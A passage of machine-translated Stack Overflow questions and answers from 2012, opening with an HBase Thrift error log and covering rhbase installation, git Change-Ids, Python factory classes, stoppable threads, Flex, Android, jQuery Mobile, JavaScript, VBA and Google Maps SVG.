ib/jackson-core-asl-1.8.8.jar:/usr/lib/hadoop-mapreduce/lib/netty-3.2.4.Final.jar:/usr/lib/hadoop-mapreduce/lib/protobuf-java-2.4.0a.jar:/usr/lib/hadoop-mapreduce/lib/jersey-server-1.8.jar:/usr/lib/hadoop-mapreduce/.//hadoop-rumen.jar:/usr/lib/hadoop-mapreduce/.//hadoop-distcp-2.0.0-cdh4.1.1.jar:/usr/lib/hadoop-mapreduce/.//hadoop-mapreduce-client-common.jar:/usr/lib/hadoop-mapreduce/.//hadoop-gridmix.jar:/usr/lib/hadoop-mapreduce/.//hadoop-streaming.jar:/usr/lib/hadoop-mapreduce/.//hadoop-rumen-2.0.0-cdh4.1.1.jar:/usr/lib/hadoop-mapreduce/.//hadoop-extras-2.0.0-cdh4.1.1.jar:/usr/lib/hadoop-mapreduce/.//hadoop-mapreduce-client-common-2.0.0-cdh4.1.1.jar:/usr/lib/hadoop-mapreduce/.//hadoop-distcp.jar:/usr/lib/hadoop-mapreduce/.//hadoop-mapreduce-client-core-2.0.0-cdh4.1.1.jar:/usr/lib/hadoop-mapreduce/.//hadoop-datajoin-2.0.0-cdh4.1.1.jar:/usr/lib/hadoop-mapreduce/.//hadoop-mapreduce-examples-2.0.0-cdh4.1.1.jar:/usr/lib/hadoop-mapreduce/.//hadoop-mapreduce-client-jobclient.jar:/usr/lib/hadoop-mapreduce/.//hadoop-mapreduce-client-hs.jar:/usr/lib/hadoop-mapreduce/.//hadoop-mapreduce-client-core.jar:/usr/lib/hadoop-mapreduce/.//hadoop-archives.jar:/usr/lib/hadoop-mapreduce/.//hadoop-mapreduce-client-jobclient-2.0.0-cdh4.1.1-tests.jar:/usr/lib/hadoop-mapreduce/.//hadoop-mapreduce-examples.jar:/usr/lib/hadoop-mapreduce/.//hadoop-mapreduce-client-hs-2.0.0-cdh4.1.1.jar:/usr/lib/hadoop-mapreduce/.//hadoop-mapreduce-client-jobclient-2.0.0-cdh4.1.1.jar:/usr/lib/hadoop-mapreduce/.//hadoop-mapreduce-client-shuffle.jar:/usr/lib/hadoop-mapreduce/.//hadoop-datajoin.jar:/usr/lib/hadoop-mapreduce/.//hadoop-mapreduce-client-shuffle-2.0.0-cdh4.1.1.jar:/usr/lib/hadoop-mapreduce/.//hadoop-mapreduce-client-app.jar:/usr/lib/hadoop-mapreduce/.//hadoop-archives-2.0.0-cdh4.1.1.jar:/usr/lib/hadoop-mapreduce/.//hadoop-gridmix-2.0.0-cdh4.1.1.jar:/usr/lib/hadoop-mapreduce/.//hadoop-mapreduce-client-app-2.0.0-cdh4.1.1.jar:/usr/lib/hadoop-mapreduce/.//hadoop-streaming-2.0.0-cdh4.1.1.jar:/usr/lib/hadoop-mapreduce/.//hadoop-extras.jar
12/10/29 15:51:55 INFO zookeeper.ZooKeeper: Client environment:java.library.path=//usr/lib/hadoop/lib/native:/usr/lib/hbase/bin/../lib/native/Linux-amd64-64
12/10/29 15:51:55 INFO zookeeper.ZooKeeper: Client environment:java.io.tmpdir=/tmp
12/10/29 15:51:55 INFO zookeeper.ZooKeeper: Client environment:java.compiler=<NA>
12/10/29 15:51:55 INFO zookeeper.ZooKeeper: Client environment:os.name=Linux
12/10/29 15:51:55 INFO zookeeper.ZooKeeper: Client environment:os.arch=amd64
12/10/29 15:51:55 INFO zookeeper.ZooKeeper: Client environment:os.version=2.6.32-220.23.1.el6.x86_64
12/10/29 15:51:55 INFO zookeeper.ZooKeeper: Client environment:user.name=root
12/10/29 15:51:55 INFO zookeeper.ZooKeeper: Client environment:user.home=/root
12/10/29 15:51:55 INFO zookeeper.ZooKeeper: Client environment:user.dir=/usr/bin
12/10/29 15:51:55 INFO zookeeper.ZooKeeper: Initiating client connection, connectString=localhost:2181 sessionTimeout=180000 watcher=hconnection
12/10/29 15:51:55 INFO zookeeper.RecoverableZooKeeper: The identifier of this process is 15842@localhost.localdomain
12/10/29 15:51:55 INFO zookeeper.ClientCnxn: Opening socket connection to server localhost.localdomain/127.0.0.1:2181\. Will not attempt to authenticate using SASL (Unable to locate a login configuration)
12/10/29 15:51:55 INFO zookeeper.ClientCnxn: Socket connection established to localhost.localdomain/127.0.0.1:2181, initiating session
12/10/29 15:51:55 INFO zookeeper.ClientCnxn: Session establishment complete on server localhost.localdomain/127.0.0.1:2181, sessionid = 0x13aad9c16a60009, negotiated timeout = 40000
12/10/29 15:51:56 WARN conf.Configuration: hadoop.native.lib is deprecated. Instead, use io.native.lib.available
Exception in thread "main" org.apache.thrift.transport.TTransportException: Could not create ServerSocket on address /0.0.0.0:9090.
    at org.apache.thrift.transport.TServerSocket.<init>(TServerSocket.java:93)
    at org.apache.thrift.transport.TServerSocket.<init>(TServerSocket.java:79)
    at org.apache.hadoop.hbase.thrift.ThriftServer.doMain(ThriftServer.java:1028)
    at org.apache.hadoop.hbase.thrift.ThriftServer.main(ThriftServer.java:1066) 
```

（对不起所有的混乱）。最后我尝试安装 rhbase 并得到那个错误......

```
[root@localhost cloudera]# sudo -E R CMD INSTALL rhbase_1.1.tar.gz
* installing to library ‘/usr/lib64/R/library’
* installing *source* package ‘rhbase’ ...
** libs
g++ -m64 -I/usr/include/R -DNDEBUG  -I/usr/local/include   -I. -g  -DHAVE_UINTPTR_T -DHAVE_NETDB_H=1 -fpermissive -DHAVE_INTTYPES_H -DHAVE_NETINET_IN_H -I./gen_cpp `pkg-config --cflags thrift` -Wall -fpic  -O2 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector --param=ssp-buffer-size=4 -m64 -mtune=generic  -c Hbase.cpp -o Hbase.o
g++ -m64 -I/usr/include/R -DNDEBUG  -I/usr/local/include   -I. -g  -DHAVE_UINTPTR_T -DHAVE_NETDB_H=1 -fpermissive -DHAVE_INTTYPES_H -DHAVE_NETINET_IN_H -I./gen_cpp `pkg-config --cflags thrift` -Wall -fpic  -O2 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector --param=ssp-buffer-size=4 -m64 -mtune=generic  -c Hbase_constants.cpp -o Hbase_constants.o
g++ -m64 -I/usr/include/R -DNDEBUG  -I/usr/local/include   -I. -g  -DHAVE_UINTPTR_T -DHAVE_NETDB_H=1 -fpermissive -DHAVE_INTTYPES_H -DHAVE_NETINET_IN_H -I./gen_cpp `pkg-config --cflags thrift` -Wall -fpic  -O2 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector --param=ssp-buffer-size=4 -m64 -mtune=generic  -c Hbase_types.cpp -o Hbase_types.o
g++ -m64 -I/usr/include/R -DNDEBUG  -I/usr/local/include   -I. -g  -DHAVE_UINTPTR_T -DHAVE_NETDB_H=1 -fpermissive -DHAVE_INTTYPES_H -DHAVE_NETINET_IN_H -I./gen_cpp `pkg-config --cflags thrift` -Wall -fpic  -O2 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector --param=ssp-buffer-size=4 -m64 -mtune=generic  -c tools.cc -o tools.o
g++ -m64 -shared -L/usr/local/lib64 -o rhbase.so Hbase.o Hbase_constants.o Hbase_types.o tools.o -L/usr/local/lib -lthrift -L/usr/lib64/R/lib -lR
installing to /usr/lib64/R/library/rhbase/libs
** R
** inst
** preparing package for lazy loading
** help
*** installing help indices
  converting help for package ‘rhbase’
    finding HTML links ... done
    admin                                   html 
    functions                               html 
    rhbase                                  html 
** building package indices
** testing if installed package can be loaded
Error in dyn.load(file, DLLpath = DLLpath, ...) :
  unable to load shared object '/usr/lib64/R/library/rhbase/libs/rhbase.so':
  libthrift-0.9.0.so: cannot open shared object file: No such file or directory
Error: loading failed
Execution halted
ERROR: loading failed
* removing ‘/usr/lib64/R/library/rhbase’ 
```

建议？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-09-22T18:11:55.263

/sbin/ldconfig /usr/lib/libthrift-0.8.0.so

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-12-17T15:26:15.643

[我在我的博客Digg Data](http://diggdata.in/post/67561846971/fetch-data-from-hbase-database-from-r-using-rhbase)上写了一篇关于安装 RHbase 和从 R 处理 hbase 的详细文章

我希望它对你有所帮助

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-30T12:13:36.240

I solved it by copying libthrift-0.9.0.so to /usr/lib/, which seems obvious now but was counter to the instructions on the install site.

# git - Git合并和添加更改ID

> ID：13125268
> 
> 赞同：4
> 
> 时间：2012-10-29T16:02:56.407
> 
> 标签：git, version-control, gerrit

随后将更改 id 添加到合并提交的正确方法是什么？

我合并了来自主分支的一些更改，这导致了不包含更改 ID 的合并提交。这不是最后一次提交，所以 commit --amend 不起作用。

我尝试使用交互式 rebase，但在其他提交中找不到合并提交来重写提交消息。

我该如何解决这个问题？有避免这些情况的方法吗？

谢谢，

户比

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T17:23:03.990

您可以使用

```
git rebase -i --preserve-merges 
```

或者

```
git checkout -b temp SHA1-of-merge
git commit --amend # this is where you change your message
git rebase --onto temp SHA1-of-merge my-branch 
```

请记住，在此之后您将需要强制推送您的分支，并且可能需要告诉当前正在处理 repo 的任何人。

# python - 处理将一个类拆分为多个类的大多数 Pythonic 方式

> ID：13125271
> 
> 赞同：5
> 
> 时间：2012-10-29T16:03:07.950
> 
> 标签：python

我有一个可以与 Oracle 或 MySQL 交互的类。该类使用“Oracle”或“MySQL”关键字和一些其他数据库类型的标准参数（打印什么，是否停止异常等）进行初始化。

在我开始时根据需要添加很容易`if Oracle do A, elif MySQL do B`，但是随着我添加更多仅适用于一种数据库类型的专用代码，这变得很难看。我将这个类分成两部分，一类用于 Oracle，另一类用于 MySQL，并带有一些共享函数以避免重复代码。

处理调用这些新类的最 Pythonic 方式是什么？我是否创建一个使用相同关键字并返回正确类的包装函数/类？我是否将所有调用旧泛型类的代码更改为调用正确的特定于 DB 的类？

如果需要，我很乐意模拟一些示例代码，但我认为没有必要。提前感谢您的帮助！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-29T16:37:29.857

> 我是否创建一个使用相同关键字并返回正确类的包装函数/类？

这就是想法。这样的函数称为工厂函数：

```
def connect_to(db, *args):
    if db == "MySQL":
        return MySQL(*args)
    elif db == "Oracle":
        return Oracle(*args)
    else:
        raise ValueError("unknown database type: %r" % db) 
```

确保两个数据库类具有相同的 API。您可以使用鸭子类型或抽象基类 (ABC) 来实现这一点；如果在类之间共享功能，或者如果您想`isinstance`检查对象是否代表数据库连接，则后者最有用。

在共享功能的情况下，[模板方法模式](http://www.aleax.it/gdd_pydp.pdf)通常会派上用场。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-29T16:11:43.650

创建一个工厂类，它根据参数返回一个实现。然后，您可以为两种 DB 类型使用一个通用基类，每种都有一个实现，并让工厂根据参数创建、配置和返回正确的实现给用户。

当两个类的行为非常相似时，这很有效；但是一旦您想使用 DB 特定功能，它就会变得丑陋，因为您需要像`isFeatureXSupported()`（好方法）或`isOracle()`（更简单但不好的方法，因为它将帮助程序类中的哪个 DB 具有哪个功能的知识转移到应用程序代码中）。

或者，您可以实现两者的所有功能并在不支持时抛出异常。在您的代码中，您可以查找异常来检查这一点。这使代码更干净，但现在，您可以真正检查某个功能是否可用，而无需实际使用它。这可能会导致应用程序代码出现问题（例如，当您想要禁用菜单时，或者当应用程序可以通过其他方式执行此操作时）。

# sqlite - 无法在 flex 4.6 中设置列 表控件的 labelField

> ID：13125272
> 
> 赞同：0
> 
> 时间：2012-10-29T16:03:10.467
> 
> 标签：sqlite, actionscript-3, apache-flex, flex4.5, flex4.6

我无法设置列表控件的标签，我首先将其保存到 SQLite 数据库，然后将其显示为列表控件的 lebelField，我的代码如下：

城市列表 mxml 是：

```
<?xml version="1.0" encoding="utf-8"?>
<s:View xmlns:fx="http://ns.adobe.com/mxml/2009" 
    xmlns:s="library://ns.adobe.com/flex/spark" title="Cities"
    >
<fx:Declarations>
    <!-- Place non-visual elements (e.g., services, value objects) here -->
</fx:Declarations>

<fx:Script>
    <![CDATA[
        import model.DataModel;

        import mx.collections.ArrayCollection;
        import mx.events.FlexEvent;
        import mx.events.IndexChangedEvent;

        import spark.components.SplitViewNavigator;
        import spark.components.ViewNavigator;
        import spark.transitions.ViewTransitionBase;
        protected function myList_changeHandler():void {
            // Create a reference to the SplitViewNavigator.
            var splitNavigator:SplitViewNavigator = navigator.parentNavigator as SplitViewNavigator;

            // Create a reference to the ViewNavigator for the Detail frame.
            var detailNavigator:ViewNavigator = splitNavigator.getViewNavigatorAt(1) as ViewNavigator;

            detailNavigator.transitionsEnabled = false;

            // Change the view of the Detail frame based on the selected List item.
            detailNavigator.pushView(DisplayContents, list_of_cities.selectedItem);             
        }           
    ]]>
</fx:Script>
<s:VGroup width="100%" height="100%">
    <s:List id="list_of_cities" height="100%" width="100%" change="myList_changeHandler();" 
            dataProvider="{DataModel.getInstance().cityList}">

    </s:List>       
</s:VGroup> 
```

城市价值对象是::

```
package valueobject
{
[Bindable]
public class CityValueObject
{
    public var id:uint;
    public var nameofcity:String;
}} 
```

和 DataModel 是 ::

```
package model
{
import flash.data.SQLConnection;

import mx.collections.ArrayCollection;

[Bindable]
public class DataModel
{
    public var connection:SQLConnection;
    public var cityList:ArrayCollection = new ArrayCollection();        
    public var logs:String="Application Logs........\n";

    public static var _instance:DataModel;      

    public static function getInstance():DataModel
    {
        if(_instance == null)
        {
            _instance = new DataModel();
        }
        return _instance;
    }
}} 
```

和 CityUtilities 类是：

```
package utillities
{
import flash.data.SQLResult;
import flash.data.SQLStatement;
import flash.display.Loader;
import flash.display.LoaderInfo;
import flash.events.Event;
import flash.net.URLRequest;
import flash.utils.ByteArray;

import model.DataModel;

import mx.collections.Sort;
import mx.collections.SortField;

import valueobject.CityValueObject;

public class CityUtils
{
    public static function getAllCities():void
    {
        var contactListStatement:SQLStatement = new SQLStatement();
        contactListStatement.sqlConnection = DataModel.getInstance().connection;
        contactListStatement.text = "SELECT * FROM CITYNAME";
        contactListStatement.execute();
        var result:SQLResult = contactListStatement.getResult();
        if( result.data!=null)
        {
            DataModel.getInstance().cityList.removeAll();

            for(var count:uint=0;count<result.data.length;count++)
            {
                var cityVO:CityValueObject = new CityValueObject();
                cityVO.id = result.data[count].id;
                cityVO.nameofcity = result.data[count].city;                    
                DataModel.getInstance().cityList.addItem(cityVO);
            }
        }
        sortData();     
    }

    public static function sortData():void
    {
        var dataSortField:SortField = new SortField();
        dataSortField.name = "nameofcity";
        dataSortField.numeric = false;

        /* Create the Sort object and add the SortField object created earlier to the array of fields to sort on. */
        var numericDataSort:Sort = new Sort();
        numericDataSort.fields = [dataSortField];

        /* Set the ArrayCollection object's sort property to our custom sort, and refresh the ArrayCollection. */
        DataModel.getInstance().cityList.sort = numericDataSort;
        DataModel.getInstance().cityList.refresh();
    }

    public static function updateLog(newLog:String):void
    {
        DataModel.getInstance().logs += new Date().time+" :-> "+newLog+"\n";
    }
}} 
```

请告诉我如何根据 SQLite nameofcity 列设置 labelField 提前谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-30T08:12:31.910

您需要显示 nameofcity 意味着为 spark 列表设置 LabelField 属性，如下所示

```
<s:VGroup width="100%" height="100%">
<s:List id="list_of_cities" height="100%" width="100%" labelField="nameofcity" change="myList_changeHandler();" 
        dataProvider="{DataModel.getInstance().cityList}">

</s:List> 
```

如果它显示 [object CityValueObject] 然后创建自定义 ItemRenderer 然后覆盖数据方法

```
override public function set data(value:Object):void
{
super.data = value;
var vo:CityValueObject=value as CityValueObject;
lblCityName.text = vo.nameofcity.toString(); 
```

}

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T19:33:39.100

所有其他代码都是正确的，但错误是我放置了

```
 for(var count:uint=0;count<result.data.length;count++)
        {
            var cityVO:CityValueObject = new CityValueObject();
            cityVO.id = result.data[count].id;
            //cityVO.nameofcity = result.data[count].city; // Here I should Have written like
            cityVO.nameofcity = result.data[count].nameofcity;// this works as I needed        
            DataModel.getInstance().cityList.addItem(cityVO);
        } 
```

# python - 给定可停止的伪原子工作单元，在 Python 中创建可停止线程的“正确”方法是什么？

> ID：13125276
> 
> 赞同：11
> 
> 时间：2012-10-29T16:03:14.683
> 
> 标签：python, multithreading, decorator

我正在用 Python 编写一个线程程序。这个程序被用户（CRTL+C）交互，以及其他程序发送各种信号中断非常频繁，所有这些都应该以各种方式停止线程操作。线程按顺序执行一堆工作单元（我称它们为“原子”）。

每个原子都可以快速安全地停止，因此使线程本身停止是相当微不足道的，但我的问题是：**什么是“正确”或规范的方式来实现可停止的线程，给定可停止的伪原子工作做完了？**

我应该`stop_at_next_check`在每个原子之前轮询一个标志（下面的示例）吗？我应该用做标志检查的东西来装饰每个原子（基本上与示例相同，但隐藏在装饰器中）？或者我应该使用我没有想到的其他技术？

示例（简单的停止标志检查）：

```
class stoppable(Thread):
    stop_at_next_check = False
    current_atom = None

    def __init__(self):
        Thread.__init__(self)

    def do_atom(self, atom):
        if self.stop_at_next_check:
            return False
        self.current_atom = atom
        self.current_atom.do_work()
        return True     

    def run(self):
        #get "work to be done" objects atom1, atom2, etc. from somewhere

        if not do_atom(atom1):
            return

        if not do_atom(atom2):
            return

        #...etc

    def die(self):
        self.stop_at_next_check = True
        self.current_atom.stop() 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-29T16:18:43.327

标志检查似乎是正确的，但是您错过了通过使用原子列表来简化它的机会。如果将原子放在列表中，则可以使用单个 for 循环而无需`do_atom()`方法，并且在哪里进行检查的问题本身就解决了。

```
def run(self):
    atoms = # get atoms
    for atom in atoms:
        if self.stop_at_next_check:
             break
        self.current_atom = atom
        atom.do_work() 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T16:16:42.697

创建一个“线程 x 应该继续处理”标志，当你完成线程时，将该标志设置为 false。

直接杀死线程被认为是不好的形式，因为您可能会完成一小部分工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-05-03T16:27:34.500

有点晚了，但我创建了一个小型库，蚂蚁，解决了这个问题。在您的示例中，原子单元由工人表示

例子

```
from ants import worker

@worker
def hello():
    print(“hello world”)

t = hello.start()
...
t.stop() 
```

在上面的示例中，hello() 将在一个单独的线程中运行，并在一个`while True:`循环中被调用，从而尽可能快地吐出“hello world”

您还可以触发事件，例如在上面替换`hello.start()`为`hello.start(lambda: time.sleep(5))`，您将让它每 5:th 秒触发一次

[该库非常新，GitHub https://github.com/fa1k3n/ants.git](https://github.com/fa1k3n/ants.git)上的工作正在进行中

未来的工作包括添加一个`colony`让多个工作人员处理相同数据的不同部分的工作，还计划一个`queen`工作人员通信和控制，如同步

# android - 在 AbsoluteLayout Android 上放大/缩小图像

> ID：13125277
> 
> 赞同：2
> 
> 时间：2012-10-29T16:03:15.600
> 
> 标签：android, android-layout, zooming

我正在制作一个应用程序，其中有一个小玩具，左侧有一些连衣裙（ListView），您可以选择连衣裙。从该列表视图中，您只需选择一件衣服，这件衣服就会自动添加到视图中，现在我可以轻松拖动它，但我无法放大/缩小它。

下面是我的代码：

```
 mKittyBGLayer.setOnTouchListener(new OnTouchListener() {
        public boolean onTouch(View v, MotionEvent event) {
            for (ImageView img1 : mArrayList) {
                if (kittyStatus == img1.getId()) {
                    mKittyDress = img1;
                    break;
                }
            }
            if (mKittyDress != null) {
                LayoutParams lp = new LayoutParams(LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT, (int) event.getX()
                        - mKittyDress.getWidth() / 2, (int) event.getY() - mKittyDress.getHeight() / 2);
                mKittyDress.setLayoutParams(lp);

                // Handle touch events here...
                switch (event.getAction() & MotionEvent.ACTION_MASK) {
                case MotionEvent.ACTION_DOWN:
                    savedMatrix.set(matrix);
                    start.set(event.getX(), event.getY());
                    mode = DRAG;
                    break;

                case MotionEvent.ACTION_POINTER_DOWN:
                    oldDist = spacing(event);
                    if (oldDist > 10f) {
                        savedMatrix.set(matrix);
                        midPoint(mid, event);
                        mode = ZOOM;
                    }
                    break;

                case MotionEvent.ACTION_UP:
                case MotionEvent.ACTION_POINTER_UP:
                    mode = NONE;
                    break;
                case MotionEvent.ACTION_MOVE:
                    if (mode == DRAG) {
                        // ...
                        matrix.set(savedMatrix);
                        matrix.postTranslate(event.getX() - start.x, event.getY() - start.y);
                    } else if (mode == ZOOM) {
                        float newDist = spacing(event);
                        if (newDist > 10f) {
                            matrix.set(savedMatrix);
                            float scale = newDist / oldDist;
                            matrix.postScale(scale, scale, mid.x, mid.y);
                        }
                    }
                    break;
                }

                mKittyDress.setImageMatrix(matrix);
                return true; // indicate event was handled
            }
            return true;
        }
    });

      /** Determine the space between the first two fingers */
private float spacing(MotionEvent event) {
    float x = event.getX(0) - event.getX(1);
    float y = event.getY(0) - event.getY(1);
    return FloatMath.sqrt(x * x + y * y);
}

/** Calculate the mid point of the first two fingers */
private void midPoint(PointF point, MotionEvent event) {
    float x = event.getX(0) + event.getX(1);
    float y = event.getY(0) + event.getY(1);
    point.set(x / 2, y / 2);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T16:11:17.130

在这种情况下，我实际上所做的是使用 a`WebView`来显示图像。这为用户提供了与他们习惯完全匹配的缩放/滚动手势和惯性。

# jquery - JQM：如何从第一个选项的文本中分离选择显示的文本

> ID：13125281
> 
> 赞同：1
> 
> 时间：2012-10-29T16:03:32.240
> 
> 标签：jquery, select, mobile, jquery-mobile

我需要将关闭的选择框中显示的文本与第一个选项（或“选定”选项）的文本“分离”。这样做的原因是我想使用封闭的选择作为标签，并使用第一个（或选定的）选项来选择所有项目。

为了让事情更清楚（至少我希望如此:-)，我举了一个 html 的例子：

```
<select id="fruits">
    <option selected="selected">Fruits</option>
    <option>cherry</option>
    <option>apple</option>
</select> 
```

这将给出“水果”的选定项目文本，但我想显示 - 比如说 - “选择所有水果”。

我正在尝试类似的东西：

```
$("#fruits").bind('click', function() {
    $("#fruits option:first-child").html("Select all fruits");
}); 
```

但它似乎适用于桌面浏览器，但不适用于移动设备（至少不适用于 Android 2.3.4 浏览器）。

有什么提示吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T10:22:21.800

我终于解决了这个问题，只是更好地阅读[QDM 文档](http://jquerymobile.com/demos/1.0a4.1/docs/forms/forms-selects.html#&ui-state=dialog)：使用具有这些属性的选择：

```
 multiple="multiple" data-native-menu="false" 
```

（对我来说，多项选择是一项要求；抱歉，此答案并未完全涵盖单项选择...），JQM 构建了一个弹出窗口，其中第一个选项（不得设置“值”）作为标题。因此，您可以使用第一个选项（没有任何“值”）作为（关闭的）选择的标签。

这是来自 JQM 文档页面的相关代码：

```
<div data-role="fieldcontain">
    <label for="select-choice-9" class="select">Choose shipping method(s):</label>
    <select name="select-choice-9" id="select-choice-9" multiple="multiple" data-native-menu="false">
        <option>Choose options</option>
        <option value="standard">Standard: 7 day</option>
        <option value="rush">Rush: 3 days</option>
        <option value="express">Express: next day</option>
        <option value="overnight">Overnight</option>
    </select>
</div> 
```

# javascript - getElementByTagName 不起作用？

> ID：13125284
> 
> 赞同：2
> 
> 时间：2012-10-29T16:03:40.727
> 
> 标签：javascript

在下面的代码中，我通过使用 javascript 为所有偶数行动态分配“偶数”类来为所有偶数行应用不同的背景颜色。我正在调用body标签的alternamte()函数onload。

起初，我使用 getElementById 来获取表对象，并且我的代码运行良好。但是，我想将此样式应用于我页面上的所有表格，因此我需要通过标签名称使用获取元素。

一旦我找到了getElementByTagName，我的代码就停止了工作，我一直试图找出问题的根源，但没有成功。我想知道是否有人可以帮助我理解为什么在更改 getElementByTagName 后我的代码停止工作？

```
 <script type="text/javascript"> 
    function alternate(){
        var table = document.getElementsByTagName("table");   
        var rows = table.getElementsByTagName("tr");   

        for(i = 0; i < rows.length; i++){           
            //change style of even rows 
            //(odd integer values, since we're counting from zero)
            if(i % 2 == 0){ 
                rows[i].className = "even"; 
            }     
        }   
    }
  </script> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-29T16:04:54.047

它是[getElementsByTagName()](https://developer.mozilla.org/en-US/docs/Web/API/Element/getElementsByTagName)，复数。它返回一个 HTMLCollection

```
var table = document.getElementsByTagName("table")[0]; 
```

（如果您确信`<table>`页面上有一个。）

如果你想对*所有*元素做一些事情，`<table>`你必须做这样的事情：

```
 var tables = document.getElementsByTagName("table");   

    for (var ti = 0; ti < tables.length; ++ti) {
      var rows = tables[ti].getElementsByTagName("tr");   
      for(var i = 0; i < rows.length; i++){           
        //change style of even rows 
        //(odd integer values, since we're counting from zero)
        if(i % 2 == 0){ 
            rows[i].className = "even"; 
        }     
      }   
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-29T16:04:28.727

使用`getElementsByTagName`代替`getElementByTagName`（getElementsByTagName 返回多个节点元素）

```
 var table = document.getElementsByTagName("table")[0], trs, rl;  
 vat tl= table.length;
 while(tl--){
        trs = tables[tl].getElementsByTagName("tr");
        rl = trs.length;
        while(rl--){
           if(rl % 2 == 0){ 
              trs[rl].className = "even"; 
           } 
        }
  } 
```

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2012-10-29T16:10:00.953

getElementsByTagName() 返回一个匹配选择器的数组。因此尝试

```
var table = getElementsByTagName('table')[indexnumber]; 
```

# android - 如何连接到设备的 sqlite DB

> ID：13125286
> 
> 赞同：2
> 
> 时间：2012-10-29T16:03:51.507
> 
> 标签：android, sqlite

我正在尝试找出如何连接到我手机的 sqlite 数据库。我在网上浏览了一下，但找不到任何我 100% 理解的东西。

到目前为止，我正在打开 cmd 提示符并更改为 android-sdk/platform-tools 目录。从这里我正在运行 adb shell。从这一点我如何连接到手机的数据库？

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:07:33.007

手机没有通用的 sqlite 数据库。每个应用程序可能有也可能没有自己的一个或多个数据库。

如果您知道特定应用程序的包前缀，则可能可以获得其数据库的副本。

请参阅： [设备上 sqlite 数据库的位置](https://stackoverflow.com/questions/4452538/android-location-of-sqlite-database-on-the-device?rq=1)

# vba - 在 VBA 中，文档和子模板是否可以访问模板全局变量？

> ID：13125287
> 
> 赞同：1
> 
> 时间：2012-10-29T16:03:59.810
> 
> 标签：vba, office-2010

我正在 Word 2010 中编写一个基于另一个模板的模板，这两个模板都包含大量的 VBA 代码。我已经引用了原始模板来访问它的模块。原始模板中的全局变量是否也可以通过这种方式访问​​？如果是这样，是否有访问它们的编码标准，例如：

```
TheTemplate.VariableName 
```

或者可以通过名称访问它们：

```
VariableName 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:17:17.323

每个模板都是一个封闭的对象。对于当前加载的任何其他模板，模板模块的任何全局变量都不可访问或可见。

您可以做的是向文档对象添加公共属性。将它们添加到每个文档都有的“ThisDocument”类模块中，例如像这样的字符串属性：

```
Public Property Get Foo() As String
  Foo = "Any value"
End Property 
```

现在您可以从任何地方访问该属性，因为它将被该`Document`对象公开：

```
MsgBox Application.Documents("appropriate document reference").Foo
' alerts "Any value" 
```

# google-maps - 如何在 Google Maps API v3 中指示 SVG 路径的透明度？

> ID：13125289
> 
> 赞同：2
> 
> 时间：2012-10-29T16:04:06.970
> 
> 标签：google-maps, svg

我一直在寻找和关闭stackoverflow并没有找到答案，所以这里......

我有一个公共汽车的自定义 SVG 图像路径（见下文），它正在正确绘制并“切掉”我想要透明的部分，而不是前灯。我查看了[http://www.w3.org/TR/SVG/paths.html#PathData](http://www.w3.org/TR/SVG/paths.html#PathData)上的 SVG 路径数据文档，并且一定遗漏了一些东西。我不知道如何（在路径数据中，或者可能不在其中）识别填充的内容以及透明蒙版或非填充区域的一部分。这就是我正在使用的。

```
var busSvg = {
    // Bus body
    // 282 wide... 322 wide with the sides added
    top : 'c-4,-20,-18,-30,-38,-38 c-20,-8,-68,-18,-113,-19 c-35,1,-83,11,-113,19 c-20,8,-34,10,-38,38',
    left : ' l-20,150 v170',
    bottom : ' h26 v25 c0,30,45,30,45,0 v-25 h200 v25 c0,30,45,30,45,0 v-25 h26',
    right : ' v-170 l-20,-150z',
    // Marquee
    marquee : 'm-60,10 h-182 c-20,0,-20,-25,0,-25 h182 c20,0,20,25,0,25z',
    // Windshield
    windshield : 'm-220,150 c-11,0,-14,-8,-12,-16 l12,-85 c2,-10,5,-17,18,-17 h220 c13,0,17,7,18,17 l12,85, c1,8,-1,16,-12,16 h-235z',
    // Tires
    tire_left : 'm15,100 c0,30,45,30,45,0 c0,-30,-45,-30,-45,0',
    tire_right : 'm180,0 c0,30,45,30,45,0 c0,-30,-45,-30,-45,0',
};

var busIcon = {
    path: 'M0,-100 '+busSvg['top']+busSvg['left']+busSvg['bottom']+busSvg['right']+busSvg['marquee']+busSvg['windshield']+busSvg['tire_left']+busSvg['tire_right'],
    fillColor: "red",
    fillOpacity: 1,
    scale: .3, //.05,
    strokeColor: "black",
    strokeWeight: .5
}; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:15:11.350

[填充规则](http://www.w3.org/TR/SVG/painting.html#FillRuleProperty)确定形状的哪些部分在其内部/外部。

# android - 从android中的arraylist中删除多个对象

> ID：13125294
> 
> 赞同：1
> 
> 时间：2012-10-29T16:04:23.170
> 
> 标签：android, arraylist

我有一个`ArrayList<String>`包含 n 个元素的 A，以及一个`ArrayList<Integer>`包含 A 中需要删除的索引的 B。如何删除这些索引？在我删除这样的索引后 : `A.remove(index)`，然后 A 的大小更小，其他索引不再位于同一位置。

欢迎任何想法。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-29T16:05:43.890

